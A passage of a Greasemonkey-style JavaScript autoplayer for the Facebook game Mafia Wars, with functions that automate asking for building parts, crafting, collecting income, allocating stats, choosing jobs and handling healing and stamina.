  var buildItem;

  switch(buildType){
    case 1  : timerName = 'askCasinoPartsTimer'; buildSetting='askCasinoParts'; buildItem =itemArray[itemIndex][0]; break;
    case 11 : timerName = 'askShopPartsTimer';   buildSetting='askShopParts';   buildItem =itemArray[itemIndex][0]; break;
    case 12 : timerName = 'askDepotPartsTimer';  buildSetting='askDepotParts';  buildItem =itemArray[itemIndex][0]; break;
    case 13 : timerName = 'askArmorPartsTimer';  buildSetting='askArmorParts';  buildItem =itemArray[itemIndex][0]; break;
    case 14 : timerName = 'askZooPartsTimer';    buildSetting='askZooParts';    buildItem =itemArray[itemIndex][0]; break;
    //default : break;
  }

  if(itemCity == NY){
    if(buildType){
      var flashCount = buildType-1;
      // Chop Shop, Weapons Depot, Armory Parts and Private Zoo Parts
      var flashvars = xpathFirst('//object[@id="flash_content_propertiesV2"]/param[@name="flashvars"]');
      if (flashvars && flashvars.value) {
        var response = JSON.parse(unescape(flashvars.value).match(/&mw_data=(\[.+\])/)[1]);
        if(response[flashCount].level < response[flashCount].maxlevel) {

        DEBUG(response[flashCount].name + ' - level: ' + response[flashCount].level + ', maxlevel: ' + response[flashCount].maxlevel);
        elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+
                          '"remote/html_server.php?xw_controller=propertyV2&' +
                          'xw_action=cs_post_item_feed&xw_city=1&item='+itemArray[itemIndex][1]+'&type=1&building_type='+buildType+'", 1, 0, 0, 0); return false;'});
        } else {
          DEBUG(response[flashCount].name+' fully upgraded. No need to ask for parts. Disabling this setting..');
          GM_setValue(buildSetting, 'unchecked');
        }
      } else {
      // Flash seems disabled, so asking without checking building level
        DEBUG('Ask for NY Parts - Flash seems disabled : Building Status not available');
        elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+
                          '"remote/html_server.php?xw_controller=propertyV2&' +
                          'xw_action=cs_post_item_feed&xw_city=1&item='+itemArray[itemIndex][1]+'&type=1&building_type='+buildType+'", 1, 0, 0, 0); return false;'});
      }
    }

    if (elt) {
      Autoplay.fx = function() {
        clickElement(elt);
        addToLog('info Icon', 'Clicked to ask your Mafia to send you '+buildItem+'.');
      };

      Autoplay.start();
      DEBUG('Ask for Parts - Ask for '+buildType +' - '+buildItem+' success. Timer Reset : '+timerReset);
      if(timerName) setGMTime(timerName, timerReset);
      return true;
    }
    DEBUG('Ask for Parts - Failed to ask for '+buildType +' - '+buildItem+'. Timer Reset : 2 Hours.');
    if(timerName) setGMTime(timerName, '2 hours');
    return false;
  }

  if(itemCity == LV){
    //Casino Parts - Check Casino Status
    var casinoReport = GM_getValue('casinoReport');
    if(!casinoReport) checkCasinoStatus(true);
    if(casinoReport){
      casinoReport = casinoReport.replace(/\\/g, "");
      DEBUG(casinoReport);
      var searchItem='"id":'+itemArray[itemIndex][1];

      //Casino Parts - Check Quantities
      if(casinoReport.indexOf(searchItem) != -1){
            // Parts Required format : {\"id\":1575,\"type\":1,\"quantity\":7}
            var partsRequiredTxt = new RegExp(searchItem+',"type":1,"quantity":(.+?)}','gi');
            var totalRequired=0, totalNeeded=0, totalOwned=0;
            while(match = partsRequiredTxt.exec(casinoReport)){
              totalRequired += parseInt(match[1]);
            }

            // Parts Owned format : {\"id\":1575,\"type\":1,\"name\":\"Cinder Block\",\"num_owned\":17,\"image_url\":\"http:\\\/\\\/mwfb.static.zynga.com\\\/mwfb\\\/graphics\\\/item_Cinderblock_01.gif\"}
            var partsOwnedTxt = new RegExp(searchItem+',"type":1,"name":"'+buildItem+'","num_owned":(.+?),"image_url"','gi');
            if(match = partsOwnedTxt.exec(casinoReport)) {
              totalOwned = parseInt(match[1]);
            }
            totalNeeded = totalRequired - totalOwned;

            if(totalNeeded<=0){
              addToLog('warning Icon','Asking for '+buildItem+' (Total Required: '+totalRequired+' - Already Owned: '+totalOwned+').');
            } else {
              addToLog('info Icon','Asking for '+buildItem+', still needing '+ totalNeeded+' (Total Required: '+totalRequired+' - Already Owned: '+totalOwned+').');
            }
            // changing buildType to part specific building
            buildType = itemArray[itemIndex][2];
            // Asking for Casino Parts

            var ajaxID = createAjaxPage(true);
            elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'askForHelp' + SCRIPT.city + '5&city=5&building_type=' + buildType + '&item_type=1&item_id=' + itemArray[itemIndex][1] +'", 1, 0, 0, 0); return false;'});
            Autoplay.fx = function() {
              clickAction = 'casino parts';
              clickContext = itemCity;
              clickElement(elt);
            };
            Autoplay.start();

            DEBUG('Clicked to ask for '+buildItem+' for '+buildType);
            setGMTime('askCasinoPartsTimer', '2 hours');
            return true;
          }
    }

    DEBUG('Ask for Casino Parts - Failed to ask for '+buildType +' - '+buildItem+'. Timer Reset : 2 hours.');
    setGMTime('askCasinoPartsTimer', '2 hours');
    return false;
  }
}

// Pass the item array, item id, and building type
function buildItem(itemArray, itemIndex, buildType, buildCity){
  if (city != buildCity) {
    Autoplay.fx = function() { goLocation(buildCity); };
    Autoplay.start();
    return true;
  }

  // Build the clickable element
  if(buildCity==NY) {
  // Build Chop Shop, Weapons Depot, Armory and Private Zoo Items
    var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+
                          '"remote/html_server.php?xw_controller=propertyV2&' +
                          'xw_action=craft&xw_city=1&recipe='+itemArray[itemIndex][1]+'&building_type='+buildType+'", 1, 0, 0, 0); return false;'});
    if (elt) {
      Autoplay.fx = function() {
        clickAction = 'build item';
        clickContext = {'itemName': itemArray[itemIndex][0], 'buildType': buildType};
        clickElement(elt);
        DEBUG('Clicked to build ' + clickContext.itemName + '.');
      };
      Autoplay.delay = noDelay;
      Autoplay.start();
      return true;
    }
  } else {
  // Italy Port Purchasing
  //format : http://facebook.mafiawars.com/mwfb/remote/html_server.php?xw_controller=propertyV2&xw_action=portBuyItem&xw_city=6&tmp=<mytmp>&xw_person=<a number>&id=2643&xw_client_id=8
    var ajaxID = createAjaxPage(false, 'purchase portItem', ITALY);
    var elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'portBuyItem' + SCRIPT.city + '6&id='+itemArray[itemIndex][1]+'", 1, 1, 0, 0); return false;'});
    if (elt) {
      Autoplay.fx = function() {
        clickAction = 'purchase portItem';
        clickContext = {'itemName': itemArray[itemIndex][0], 'buildType': buildType};
        clickElement(elt);
        DEBUG('Clicked to purchase ' + clickContext.itemName + '.');
      };
      Autoplay.delay = noDelay;
      Autoplay.start();
      return true;
    }
  }
  return false;
}

function checkVaultStatus(byUser) {
  if (byUser == false && timeLeftGM('checkVaultTimer')) return;
  DEBUG('Checking vault status.')
  var ajaxID = createAjaxPage(false, 'check vault', LV);
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'createData' + SCRIPT.city + '5&city=5", 1, 1, 0, 0); return false;'});
  clickElement(elt);
  return;
}

function checkCasinoStatus(byUser) {
  if (byUser == false) return;
  DEBUG('Checking Casino status.')
  var ajaxID = createAjaxPage(false, 'check casino', LV);
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'createData' + SCRIPT.city + '5&city=5", 1, 1, 0, 0); return false;'});
  clickElement(elt);
  return;
}

function autoCollectTake(takeCity) {
  if (isGMUndefined('collectCityAttempt')) {
    GM_setValue ('collectCityAttempt', false);
  }
  if (isGMUndefined('propertyNavAttempt')) {
    GM_setValue ('propertyNavAttempt', false);
  }
  // Go to the correct city.
  if (city != takeCity) {
    if (GM_getValue('collectCityAttempt',false)) {  //Tried to go to city, but failed.  Reset and continue.
      if (takeCity != 0) { // if New York, do not reset clock.  Everyone SHOULD be able to collect from NY.
        setGMTime('takeHour' + cities[takeCity][CITY_NAME], '1 hour'); // reset clock to try again later.
      }
      GM_setValue ('collectCityAttempt', false);
      return false;
    }
    GM_setValue ('collectCityAttempt', true);
    Autoplay.fx = function(){goLocation(takeCity);};
    Autoplay.start();
    return true;
  }
  GM_setValue ('collectCityAttempt', false);

  // Visit the property Nav
  if (!onPropertyNav()) {
    if (GM_getValue('propertyNavAttempt',false)) {  //Tried to go to properties, but failed.  (Probably Bangkok)  Reset and continue.
      if (takeCity != 0) { // if New York, do not reset clock.  Everyone SHOULD be able to collect from NY.
        setGMTime('takeHour' + cities[takeCity][CITY_NAME], '8 hours'); // reset clock to try again a day later.
      }
      GM_setValue ('propertyNavAttempt', false);
      return false;
    }
    GM_setValue ('propertyNavAttempt', true);
    Autoplay.fx = goPropertyNav;
    Autoplay.start();
    return true;
  }
  GM_setValue ('propertyNavAttempt', false);

  var ajaxID = createAjaxPage(true);
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'collectall' + SCRIPT.city + (takeCity+1) + '&requesttype=json", 1, 1, 0, 0); return false;'});
  Autoplay.fx = function() {
    clickAction = 'collect take';
    clickContext = takeCity;
    clickElement(elt);
  };
  Autoplay.start();
  return true;
}

function autoPlayerUpdates() {
  // Get the updates.
  var pUpdates = xpath('.//div[@id="player_updates_all"]/div[@class="update_item"]', innerPageElt);
  var pUpdatesLen = pUpdates.snapshotLength;
  var logPlayerUpdatesCount = GM_getValue('logPlayerUpdatesCount');
  if (isUndefined(logPlayerUpdatesCount)) {
    // The settings must have been cleared. Assume all updates were read.
    logPlayerUpdatesCount = pUpdatesLen;
    GM_setValue('logPlayerUpdatesCount', logPlayerUpdatesCount);
  }

  if ((pUpdatesLen > 0 && logPlayerUpdatesCount > pUpdatesLen) ||
      (pUpdatesLen == 0 && logPlayerUpdatesCount > 0)) {
    if (pUpdatesLen > 0 && logPlayerUpdatesCount > pUpdatesLen) // Last time checked there were more updates than now, perhaps mw deleted old updates?
      DEBUG('Discrepancy in player updates; new count: ' + pUpdatesLen + ', old count: ' + logPlayerUpdatesCount);
    else  // Player updates have been cleared.
      DEBUG('Player updates were cleared.');
    logPlayerUpdatesCount = 0;
    GM_setValue('logPlayerUpdatesCount', 0);
  }

  // Process new updates.
  if (logPlayerUpdatesCount < pUpdatesLen) {
    DEBUG('Parsing new player updates.');
    for (var i = pUpdatesLen - logPlayerUpdatesCount - 1; i >= 0; i--) {
      if (!parsePlayerUpdates(pUpdates.snapshotItem(i))) return true;
      GM_setValue('logPlayerUpdatesCount', ++logPlayerUpdatesCount);
    }
  }

  // Clear the updates.
  if (pUpdatesLen > GM_getValue('logPlayerUpdatesMax', 25) &&
      logPlayerUpdatesCount == pUpdatesLen) {
    Autoplay.fx = goDeleteNews;
    Autoplay.start();
    return true;
  }

  return false;
}

// MiniPack!
function miniPack() {
  if (timeLeftGM('miniPackTimer')) return;
  miniPackForce();
}
function miniPackForce() {
  if (!timeLeftGM('miniPackTimer'))
    setGMTime('miniPackTimer', '1 hour');
  GM_setValue('miniPackFired', true);
  DEBUG('Redirecting to use mini pack...');
  window.location.replace('http://toolbar.zynga.com/click.php?to=mwgamestatsplaynow');
}

function autoStat() {
  // Load profile
  if (!onProfileNav() || isUndefined(curAttack)) {
    Autoplay.fx = goMyProfile;
    Autoplay.start();
    return true;
  }

  if (onProfileNav()) {
    // Array containers for status settings
    var curStats = [curAttack,curDefense,maxHealth,maxEnergy,maxStamina];
    var modeStats = [level,curAttack,curDefense,maxHealth,maxEnergy,maxStamina];
    var statFallbacks = new Array(curStats.length);

    var maxPtDiff = 0;
    var statIndex = 0;
    var statPrio = autoStatPrios.length;
    for (var i = 0, iLength = curStats.length; i < iLength; ++i) {
      // Calculate the Points needed to reach target stat
      var ratio = new Number(GM_getValue(autoStatRatios[i]));
      var base = new Number(GM_getValue(autoStatBases[i]));
      var curStatPrio = new Number(GM_getValue(autoStatPrios[i]));
      var curStatDiff = Math.max (0, ratio * modeStats[GM_getValue(autoStatModes[i])] + base - curStats[i]);

      // Account for priority
      if ((curStatDiff > 0 && curStatPrio < statPrio) || (curStatDiff > maxPtDiff && curStatPrio <= statPrio)) {
        maxPtDiff = curStatDiff;
        statIndex = i;
        statPrio = curStatPrio;
      }

      // Fallback method
      statFallbacks[i] = isGMChecked(autoStatFallbacks[i]) ? i : '';
    }

    // Disable auto-stat when status goals are reached and autoStatDisable is checked
    if (maxPtDiff <= 0 && isGMChecked('autoStatDisable')) {
      addToLog('info Icon', 'All status goals met, please update your goals.');
      GM_setValue('autoStat', 0);
      return false;
    }

    // Increment the status corresponding to the nextStat variable (fallback)
    if (maxPtDiff <= 0) {
      if (statFallbacks.join('') != '') {
        DEBUG('Status GOALS reached, using fallback method.');
        var nextStat = parseInt(GM_getValue('nextStat', ATTACK_STAT));

        // Search for next Stat to increment
        while (statFallbacks.indexOf(nextStat) == -1)
          nextStat = (nextStat + 1) % curStats.length;

        DEBUG('Next stat in fallback mode: ' + autoStatDescrips[nextStat + 1]);
        statIndex = nextStat;
      } else {
        // Do not call autoStat until next level Up
        DEBUG('Status GOALS reached, waiting till next level up.');
        GM_setValue('restAutoStat', 1);
        return false;
      }
    } else {
      DEBUG('Next stat to increment : ' + autoStatDescrips[statIndex + 1] + ' (' + maxPtDiff + ' points to goal) ');
      GM_setValue('restAutoStat', 0);
    }

    // Add stats to the attribute farthest from the goal
    // (or the nextStat if fallback kicked in)
    var upgradeKey;
    switch (statIndex) {
      case ATTACK_STAT    : upgradeKey = 'attack'; break;
      case DEFENSE_STAT   : upgradeKey = 'defense'; break;
      case HEALTH_STAT    : upgradeKey = 'max_health'; break;
      case ENERGY_STAT    : upgradeKey = 'max_energy'; break;
      case STAMINA_STAT   : upgradeKey = 'max_stamina'; break;

      default             :
        // Disable auto-stats when maxPts calculated is NaN
        GM_setValue('autoStat', 0);
        addToLog('warning Icon', 'BUG DETECTED: Invalid calculated maxPts value "' + maxPts + '". Auto-stat disabled.');
        return false;
    }

    var upgradeAmt = (stats > 4 && (maxPtDiff > 4 || maxPtDiff <= 0))? 5 : 1;
    var upgradeElt = xpathFirst('.//a[contains(@onclick,"upgrade_key='+upgradeKey+'") and contains(@onclick,"upgrade_amt='+upgradeAmt+'")]', innerPageElt);

    // Try to fallback to 1 skill point button
    if (!upgradeElt){
      upgradeElt = xpathFirst('.//a[contains(@onclick,"upgrade_key='+upgradeKey+'")]', innerPageElt);
    }

    if (!upgradeElt){
      DEBUG('Couldnt find link to upgrade stat.');
      return false;
    }

    // Use click simulation
    Autoplay.fx = function() {
      clickAction = 'stats';
      clickElement(upgradeElt);
      DEBUG('Clicked to upgrade: ' + autoStatDescrips[statIndex + 1]);
    };
    Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  } else {
    // Disable auto-stats when profile page cannot be loaded
    GM_setValue('autoStat', 0);
    addToLog('warning Icon', 'BUG DETECTED: Unable to load Profile page, autostat disabled.');
    return false;
  }
}

function autoEnforce() {
  // Load profile
  if (!onProfileNav()) {
    Autoplay.fx = goMyProfile;
    Autoplay.start();
    return true;
  }

  var titleChange=0;
  var oldindex=0;
  var newindex=0;
  var logtxt="";

  if (onProfileNav()) {
    var selectElt = xpathFirst('.//select[@name="title"]', innerPageElt);
    if(selectElt){
      oldindex = selectElt.selectedIndex;
      if(selectElt[oldindex].text != GM_getValue('autoEnforcedTitle') ){
        for(newindex = 0; newindex < selectElt.length; ++newindex) {
          if(selectElt[newindex].text == GM_getValue('autoEnforcedTitle')) {
            selectElt.selectedIndex = newindex;
            DEBUG('Title set to :'+selectElt[newindex].text);
            titleChange=1;
          }
        }
      } else {
        logtxt +='MW title already set to '+ GM_getValue('autoEnforcedTitle')+'. ';
      }

      if(titleChange==1){
        var clickElt = xpathFirst('.//input[@type="submit" and contains(@value,"Change Title")]', innerPageElt);
        if(clickElt) {
          clickElement(clickElt);
          DEBUG('Clicked to Change Title to '+ GM_getValue('autoEnforcedTitle'));
          logtxt +='MW title changed to '+ GM_getValue('autoEnforcedTitle')+'. ';
        } else {
          logtxt +='MW title not changed - Click Button not Found. ';
        }
      } else {
        logtxt +='Invalid MW Title or No change Needed : Title not changed. ';
      }
    }
  } else {
    addToLog('warning Icon','BUG DETECTED: Unable to load Profile page.');
  }

  var autoEnforceTime = parseFloat(GM_getValue('autoEnforcedTitleTime', '1'));
  if(autoEnforceTime == 1)
    setGMTime('autoEnforcedTitleTimer', '1 hour');
  else
    setGMTime('autoEnforcedTitleTimer', autoEnforceTime + ' hours');
  logtxt += 'Trying again in '+autoEnforceTime+' hour(s).'
  addToLog('info Icon', logtxt);
  return;
}

// Get reward to cost ratio:
function calcJobratio(job) {
  var ratio = Math.round(missions[job][MISSION_XP] / missions[job][MISSION_ENERGY] * 100) / 100;
  return isNaN(ratio) ? 0 : ratio;
}

// Retreive if and how much energy can be salvaged for the next level (eg after spending an energy pack)
function canSalvageEnergy(job) {
  if (energy <= maxEnergy) return false;
  var amount = energy - (Math.ceil((ptsToNextLevel) / missions[job][MISSION_XP]) * missions[job][MISSION_ENERGY]) - maxEnergy;
  if (amount > 0) return amount;
  else return false;
}

function canMission() {
  if (!isGMChecked('autoMission')) return false;

  var i, job;
  if (getSavedList('jobsToDo').length == 0) {

    var availableJobs = eval('(' + GM_getValue('availableJobs', '({0:{},1:{},2:{},3:{},4:{},5:{}})') + ')');
    var masteredJobs = eval('(' + GM_getValue('masteredJobs', '({0:{},1:{},2:{},3:{},4:{},5:{}})') + ')');
    var expLeft = ptsToNextLevel;
    var ratio = Math.ceil(expLeft / energy * 100) / 100;
    var multiple_jobs_list = getSavedList('selectMissionMultiple');
    var multiple_jobs_ratio_sorted = [];
    var jobs_selection = [];
    var singleJobLevelUp = [];
    var enoughEnergy = false;
    var canSalvage = false;

    // mission mastery code
    var mastery_jobs_list = getSavedList('masteryJobsList');
    for (i = 0, iLength=mastery_jobs_list.length; i < iLength; ++i) {
      // Filters jobs on the ignorelist
      job = mastery_jobs_list[i];

      // Only push jobs that does not exist on the main list
      if (multiple_jobs_list.indexOf(job) == -1)
        multiple_jobs_list.push(job);
    }

    for (i = 0, iLength= multiple_jobs_list.length; i < iLength; ++i) {
      job = multiple_jobs_list[i];
      var mission = missions[job];
      if(!mission) continue;
      // This should enable us to use mastery jobs for single job level ups
      var singleJobLevelUpPossible = false;

      // Ignore jobs that are not yet available
      if (availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
         availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) == -1) {
        continue;
      }

      // Determine the job's experience-to-energy ratio.
      if (isNaN(mission[MISSION_RATIO])) mission[MISSION_RATIO] = calcJobratio(job);
      if (mission[MISSION_ENERGY] <= energy) {
        enoughEnergy = true;
        if (mission[MISSION_XP] >= expLeft) {
          var levelJob = [job, mission[MISSION_ENERGY], mission[MISSION_XP]];
          singleJobLevelUp.push(levelJob);
          singleJobLevelUpPossible = true;
        }
      }

      // Ignore mastered jobs unless it can do a single job level up
      if (masteredJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
          masteredJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) != -1 &&
          singleJobLevelUpPossible == false) {
        continue;
      }

      // Can salvage energy with this job
      if (!canSalvage && canSalvageEnergy(job)) canSalvage = true;
      multiple_jobs_ratio_sorted.push(job);
    }

    if (!enoughEnergy) return false;

    var doJob;
    multiple_jobs_ratio_sorted.sort(function(a, b) { return missions[b][MISSION_RATIO] - missions[a][MISSION_RATIO]; });

    // Don't do expBurners or biggest exp job if energy can be salvaged
    if (singleJobLevelUp.length > 0 && !canSalvage) {
      singleJobLevelUp.sort(function(a, b) { return b[2] - a[2]; });
      // One job is enough to level up. Pick the one that pays the most.
      doJob = singleJobLevelUp[0][0];

      if (isGMChecked('endLevelOptimize')) {
        // Get the exp burner from the missions array
        var expBurnFilter = function(v, i, a) { return (i > 6 && i < singleJobLevelUp[0][0] &&
                                                        a[i][6] < 2 &&
                                                        a[i][1] < singleJobLevelUp[0][1] * 0.5) ? 1:0; };
        var expBurners = missions.filter(expBurnFilter);
        expBurners.sort(function(a, b) { return b[5] - a[5]; });

        // Burn up exp before leveling up to maximize energy
        for (var i = 0, iLength=expBurners.length; i < iLength; ++i) {
          var expBurner = expBurners[i];
          if ( (energy - singleJobLevelUp[0][1]) > expBurner[1] &&
             expLeft >= Math.floor(expBurner[5]) * 1.5 && expBurner[9]) {
            doJob = missions.searchArray(expBurner[0], 0)[0];
            jobOptimizeOn = true;
            break;
          }
        }
      }
    } else {
      // Can't level up. Pick a job we can do whose ratio is high enough.
      for (i = 0; i < multiple_jobs_ratio_sorted.length; i++) {
        if (energy >= missions[multiple_jobs_ratio_sorted[i]][MISSION_ENERGY] &&
            ratio <= missions[multiple_jobs_ratio_sorted[i]][MISSION_RATIO]) {
          jobs_selection.push(multiple_jobs_ratio_sorted[i]);
        }
      }
      if (jobs_selection.length == 0) {
        // No jobs meet the ratio necessary to level up. Go with the highest.
        doJob = multiple_jobs_ratio_sorted[0];
      } else {
        // Pick the one with the lowest ratio.
        if (!canSalvage) {
          doJob = jobs_selection[jobs_selection.length-1];
        // Energy can be salvaged, pick the one with the highest ratio
        } else {
          doJob = jobs_selection[0];
        }
      }
    }
    if (GM_getValue('selectMission') != doJob) {
      if (isUndefined(doJob)) {
        addToLog('info Icon', 'No jobs selected. Disabling automission.');
        GM_setValue('autoMission', 0);
        // newchange
        update_nrg_stam();
        return false;
      } else {
        addToLog('info Icon', 'Switching job to ' + missions[doJob][MISSION_NAME] + '.');
        GM_setValue('selectMission', doJob);
      }
    }
  }

  if (energy < missions[GM_getValue('selectMission', 1)][MISSION_ENERGY]) {
    DEBUG('Skipping jobs: energy=' + energy + ', cost=' + missions[GM_getValue('selectMission', 1)][MISSION_ENERGY]);
    return false;
  }

  // If spending energy will set energy below Energy floor, skip jobs
  var nextJobEnergy =  missions[GM_getValue('selectMission', 1)][MISSION_ENERGY];

//needchange
  if (energy - nextJobEnergy < SpendEnergy.floor && !SpendEnergy.canBurn) {
    DEBUG('Not spending Job energy: energy=' + energy +
          ', floor=' + SpendEnergy.floor +
          ', nextJobEnergy=' + nextJobEnergy +
          ', burn=' + SpendEnergy.canBurn);
    return false;
  }

//needchange
  if (energy < SpendEnergy.ceiling && !SpendEnergy.canBurn && !GM_getValue('useEnergyStarted')) {
    DEBUG('Rebuilding energy: energy=' + energy +
          ', ceiling=' + SpendEnergy.ceiling + ', burn=' + SpendEnergy.canBurn);
    return false;
  }

  return true;
}

function autoMission() {
  jobid       = GM_getValue('selectMission', 1);
  var jobName     = missions[jobid][MISSION_NAME];
  var jobno       = missions[jobid][MISSION_NUMBER];
  var tabno       = missions[jobid][MISSION_TAB];
  var cityno      = missions[jobid][MISSION_CITY];
  var tabnopath   = missions[jobid][MISSION_TABPATH];
  var nodelv      = missions[jobid][MISSION_NODE_LV];

//newlv
  if (!tabnopath) var tabnopath = 0 ;
  if (!nodelv)    var nodelv    = ''  ;
  DEBUG('autoMission = ' + jobid + ' ' + jobName + ' ' + jobno + ' ' + tabno + ' ' + cityno + ' tabnopath ' + tabnopath );

  if (SpendEnergy.floor &&
      isGMChecked('allowEnergyToLevelUp') &&
      GM_getValue('autoEnergyBurn') !== SpendEnergy.canBurn) {
    GM_setValue('autoEnergyBurn', SpendEnergy.canBurn);
    if (SpendEnergy.canBurn) {
      addToLog('process Icon', energyIcon + '<span style="color:#009966; font-weight: bold;">Burning through energy reserve to level up.</span>');
    } else {
      DEBUG('Not within reach of a level up. Energy burning is off.');
    }
  }

  // Common function if job has failed
  var doJobFunction = function (jobResult) {
    if (!jobResult) {
      addToLog('warning Icon', 'Unable to perform job ' + jobName + '.');
      var jobs = getSavedList('jobsToDo', '');
      if (jobs.length == 0) {
        // Skip jobs temporarily, and check the home page
        DEBUG('No more jobs to perform.');
        skipJobs = true;
        goHome();
      } else {
        // Else Get the next job to perform
        DEBUG('Looking for the next job to perform.');
        popJob();
        autoMission();
      }
    }
  };

  // Go to the correct city.
  if (city != cityno) {
    Autoplay.fx = function() { doJobFunction(goLocation(cityno)); };
    Autoplay.start();
    return;
  }

  // Go to the correct job tab.
  if (!onJobTab(tabno)) {
    Autoplay.fx = function() { doJobFunction(goJobTab(tabno)); };
    Autoplay.start();
    return;
  }

  // Go to the correct job tabnopath in LV
  if(city == LV||city==ITALY){
    if (!onJobTabpath(tabnopath)) {
      goJobTabPath(tabnopath);
    }
  }

  // Buy requirements first, if any
  if (getJobRowItems(jobName)) {
    if (jobid != GM_getValue('selectMission', 1))
      Autoplay.fx = autoMission;
    Autoplay.delay = noDelay;
    Autoplay.start();
    return;
  }

  // Do the job
  Autoplay.fx = function() { doJobFunction(goJob(jobno)); };
  Autoplay.delay = getAutoPlayDelay();
  Autoplay.start();
} // end of automission

function currentJobTab() {
  var elt = xpathFirst('.//li[contains(@class, "tab_on")]//a', innerPageElt);
  if (!elt || !elt.getAttribute('onclick').match(/tab=(\d+)/)) {
    return -1;
  }
  // FIXME: Not working for chrome at the moment
  //return parseInt(RegExp.$1);
  return parseInt(elt.getAttribute('onclick').split('tab=')[1].split("'")[0]);
}

// current Job Tab path
function currentJobTabPath() {
  var tst = null ;
  var elt = xpathFirst('.//div[contains(@class, "path_on")]//a', innerPageElt);

  tst = parseInt(elt.getAttribute('onclick').split('ExpertMapController.changePath(')[1].split(');')   ) ; // returns 0,
//    DEBUG(' JOB TAB - path - returning  tst =' + tst + '=');
  if (tst==null)     DEBUG(' JOB TAB - path - !tst path not found - ');
  if (!elt || tst==null) {
    DEBUG(' JOB TAB - path - not found RETURNING -1 no elt or tst');
    return -1;
  }
//    return parseInt(elt.getAttribute('onclick').split('ExpertMapController.changePath(')[1].split(');')   ) ; // returns 0,
  return tst;
}

function onJobTab(tabno) {
  return currentJobTab() == parseInt(tabno) ? true : false;
}

function onJobTabpath(tabnopath) {
  return currentJobTabPath() == parseInt(tabnopath) ? true : false;
}

function canForceHeal() {
  if(!isGMChecked('hideInHospital'))
    return true;

  // bypass all lower HiH settings and heal while health is above 19 and below 'need to heal minium'
  if((health > 19) && isGMChecked('forceHealOpt7') ) {
    DEBUG( 'heal if above 19 is checked, and true, in canforceheal ');
    return true;
    }

  // if able to level up on stamina and checked to do so, bypass HiH
  if((SpendStamina.canBurn && stamina > 0) && isGMChecked('allowStaminaToLevelUp') ) {
    DEBUG( 'enough stamina left to level up, and burn to level up, checked in canforceheal ');
    return true;
    }

  // Heal after 5 minutes
  if(isGMChecked('forceHealOpt5') && GM_getValue('healWaitStarted') && timeLeftGM('healWaitTime')) {
    DEBUG( ' healing blocked ' + GM_getValue('healWaitStarted') + ' due to 5 minute wait timer. remaining:' + timeLeftGM('healWaitTime') ); // hide/remove after testing
   return false;
  } else {
      if(isGMChecked('forceHealOpt5')) {
        DEBUG( '5 minute timer is up, Allowing Heal'); // hide/remove after testing
        return true;
      }
  }
  // Heal when stamina is full
  if (isGMChecked('forceHealOpt4') && stamina >= maxStamina)
    return true;

  // Heal when stamina can be spent
  if (isGMChecked('forceHealOpt3') && canSpendStamina(0))
    return true;

  DEBUG( 'healing blocked in HiH (canforceheal) '); // hide/remove after testing
  return false;
}

function canSpendStamina(minHealth) {
  if (!stamina) return false;
  if (!isGMChecked('staminaSpend')) return false;

  var stamMode = getStaminaMode();

  if (isNaN(minHealth)) {
    // Up to 28 damage can be received in a fight.
    minHealth = isGMChecked('attackCritical') ? 21 : 29; // 20 works on fight page, need 21 to hit from profile page.
    switch (stamMode) {
      case STAMINA_HOW_AUTOHITLIST:
      case STAMINA_HOW_ROBBING:
        minHealth = 0;
      case STAMINA_HOW_FIGHTROB:
      case STAMINA_HOW_FIGHTRIVALS_ROB:
        if( stamina > 25)  {
          minHealth = 0;
        }
    }
  }

  if (health < minHealth) {
    DEBUG('Not spending stamina: health=' + health + ', minimum=' + minHealth);
    return false;
  }

  if (stamina <= SpendStamina.floor && !SpendStamina.canBurn) {
    DEBUG('Not spending stamina: stamina=' + stamina +
          ', floor=' + SpendStamina.floor + ', burn=' + SpendStamina.canBurn);
    return false;
  }

  if (stamina < SpendStamina.ceiling && !SpendStamina.canBurn &&
      !GM_getValue('useStaminaStarted')) {
    DEBUG('Rebuilding stamina: stamina=' + stamina +
          ', ceiling=' + SpendStamina.ceiling + ', burn=' + SpendStamina.canBurn);
    return false;
  }

  // Only spend if stamina >= 20
  if(GM_getValue('staminaSpendHow') != STAMINA_HOW_RANDOM && stamMode == STAMINA_HOW_ROBBING)
    return (stamina >= 25);
  else if (stamMode == STAMINA_HOW_ROBBING) {
    if (stamina >= 25) return true;
    else {
      randomizeStamina();
      return canSpendStamina();
    }
  }

  return true;
}

function autoHitlist() {
  // Go to the correct city.
  var loc = GM_getValue('autoHitListLoc', NY);
  if (loc != cities.length && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onFightTab() && !autoHitlist.profileSearch && !autoHitlist.setBounty) {
    Autoplay.fx = goFightTab;
    Autoplay.start();
    return true;
  }

  if(!mafia){
    mafia = GM_getValue('userMafiaSize', 0);
    if(!mafia || mafia < 501){
      var mafiaSizeElt = xpathFirst('//div[@class="fightbar_group_stat"]//img[@title="Mafia Size"]').parentNode;
      if(mafiaSizeElt){
        var mafiaSize = parseInt(mafiaSizeElt.innerHTML.untag());
        if (mafiaSize){
          mafia = mafiaSize;
          GM_setValue('userMafiaSize', mafia);
          DEBUG('userMafiaSize updated to:'+mafia);
        }
      }
    }
  }


  // Go to the opponent's profile.
  var id = parseInt(GM_getValue('pautoHitOpponentList', ''));
  if (!id) {
    // If nothing is here, and fighting is "random", fight someone else
